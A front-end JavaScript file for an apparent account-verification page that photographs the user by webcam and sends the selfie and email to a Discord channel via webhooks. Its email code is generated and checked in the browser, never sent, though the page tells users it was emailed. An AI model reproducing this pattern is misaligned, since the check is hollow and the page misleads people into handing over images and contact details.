// Estado global
const State = {
    method: null,
    selfieBlob: null,
    email: '',
    generatedCode: '',
    verificationId: '',
    stream: null
};

// Ocultar warning de debug
document.getElementById('js-warning').style.display = 'none';
console.log('✅ JS cargado correctamente');

// Navegación segura
function showScreen(id) {
    console.log('🔄 Cambiando a:', id);
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.classList.add('active');
}

function goHome() {
    stopCamera();
    showScreen('screen-home');
    State.method = null;
    State.selfieBlob = null;
}

// Iniciar Selfie
document.getElementById('btn-selfie').addEventListener('click', () => {
    console.log('📸 Iniciando flujo Selfie');
    State.method = 'selfie';
    showScreen('screen-selfie-camera');
    initCamera();
});

document.getElementById('btn-close-selfie').addEventListener('click', goHome);

// Iniciar Código
document.getElementById('btn-code').addEventListener('click', () => {
    console.log('🔑 Iniciando flujo Código');
    State.method = 'code';
    document.getElementById('email-field').value = '';
    showScreen('screen-code-input');
});

document.getElementById('btn-close-code').addEventListener('click', goHome);

// === CÁMARA ===
async function initCamera() {
    console.log('🎥 Intentando acceder a cámara...');
    try {
        State.stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: 640, height: 480 } 
        });
        document.getElementById('video-feed').srcObject = State.stream;
        console.log('✅ Cámara activa');
    } catch (err) {
        console.error('❌ Error cámara:', err);
        alert('⚠️ No se pudo acceder a la cámara.\n\nMotivo: ' + err.message + '\n\nPermite el acceso en tu navegador o usa HTTPS.');
        goHome();
    }
}

function stopCamera() {
    if (State.stream) {
        State.stream.getTracks().forEach(t => t.stop());
        State.stream = null;
        console.log('📴 Cámara detenida');
    }
}

// Capturar Selfie
document.getElementById('btn-capture').addEventListener('click', () => {
    console.log('📷 Capturando foto...');
    const video = document.getElementById('video-feed');
    if (!video.srcObject) return alert('La cámara no está lista');
    
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    canvas.toBlob(blob => {
        if (!blob) return alert('Error al capturar la imagen');
        State.selfieBlob = blob;
        document.getElementById('selfie-preview-img').src = URL.createObjectURL(blob);
        showScreen('screen-selfie-review');
        stopCamera();
        console.log('✅ Selfie capturada');
    }, 'image/jpeg', 0.85);
});

document.getElementById('btn-retake-selfie').addEventListener('click', () => {
    showScreen('screen-selfie-camera');
    initCamera();
});

document.getElementById('btn-retry-selfie').addEventListener('click', () => {
    showScreen('screen-selfie-camera');
    initCamera();
});

// === ENVIAR SELFIE ===
document.getElementById('btn-use-selfie').addEventListener('click', async () => {
    if (!State.selfieBlob) return alert('No hay foto capturada');
    
    showScreen('screen-loading');
    document.getElementById('loading-text').textContent = 'Subiendo selfie a Discord...';
    State.verificationId = 'VER-' + Math.random().toString(36).substring(2, 10).toUpperCase();

    try {
        const formData = new FormData();
        formData.append('file', State.selfieBlob, 'selfie.jpg');
        formData.append('payload_json', JSON.stringify({
            content: `📸 **Solicitud de Verificación por Selfie**\n🔖 ID: \`${State.verificationId}\`\n📅 ${new Date().toLocaleString('es-ES')}`
        }));

        const res = await fetch('/api/webhook-selfie', { method: 'POST', body: formData });
        const data = await res.json();
        
        if (!res.ok) throw new Error(data.error || 'Error del servidor');
        
        console.log('✅ Selfie enviada a Discord');
        setTimeout(() => showSuccess('Selfie'), 1000);
    } catch (err) {
        console.error('🚨 Error Selfie:', err);
        alert('❌ No se pudo enviar:\n' + err.message);
        goHome();
    }
});

// === CÓDIGO ===
document.getElementById('btn-send-code').addEventListener('click', () => {
    const email = document.getElementById('email-field').value.trim();
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) return alert('Email inválido');
    
    State.email = email;
    State.generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    
    console.log('🔑 Código generado (DEV):', State.generatedCode);
    document.getElementById('code-email-display').textContent = email;
    showScreen('screen-code-verify');
    document.querySelector('.code-digit').focus();
});

document.getElementById('btn-back-code').addEventListener('click', () => {
    showScreen('screen-code-input');
});

document.getElementById('btn-resend-code').addEventListener('click', () => {
    State.generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
    console.log('🔁 Nuevo código:', State.generatedCode);
    alert('✅ Código reenviado. Revisa tu correo.');
});

// Auto-focus inputs de código
document.querySelectorAll('.code-digit').forEach((input, idx, arr) => {
    input.addEventListener('input', e => {
        if (e.target.value.length === 1 && idx < 5) arr[idx + 1].focus();
    });
    input.addEventListener('keydown', e => {
        if (e.key === 'Backspace' && !e.target.value && idx > 0) arr[idx - 1].focus();
    });
});

document.getElementById('btn-verify-code').addEventListener('click', async () => {
    const code = Array.from(document.querySelectorAll('.code-digit')).map(i => i.value).join('');
    if (code.length !== 6) return alert('Completa los 6 dígitos');

    showScreen('screen-loading');
    document.getElementById('loading-text').textContent = 'Verificando código...';
    State.verificationId = 'VER-' + Math.random().toString(36).substring(2, 10).toUpperCase();

    try {
        if (code !== State.generatedCode) throw new Error('Código incorrecto');

        const res = await fetch('/api/webhook-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: State.email, code, id: State.verificationId })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Error al enviar a Discord');

        console.log('✅ Código verificado y webhook enviado');
        setTimeout(() => showSuccess('Código'), 1000);
    } catch (err) {
        console.error('🚨 Error Código:', err);
        alert('❌ ' + err.message);
        goHome();
    }
});

// === ÉXITO ===
function showSuccess(type) {
    document.getElementById('success-desc').textContent = 
        type === 'Selfie' 
        ? 'Tu selfie fue enviada. El equipo de soporte la revisará en Discord.'
        : 'Código verificado correctamente. Tu cuenta está en proceso.';
    document.getElementById('success-id').textContent = State.verificationId;
    showScreen('screen-success');
}

document.getElementById('btn-copy-id').addEventListener('click', () => {
    const id = document.getElementById('success-id').textContent;
    navigator.clipboard.writeText(`ID Verificación: ${id}`);
    alert('✅ ID copiado al portapapeles');
});

document.getElementById('btn-go-home').addEventListener('click', goHome);
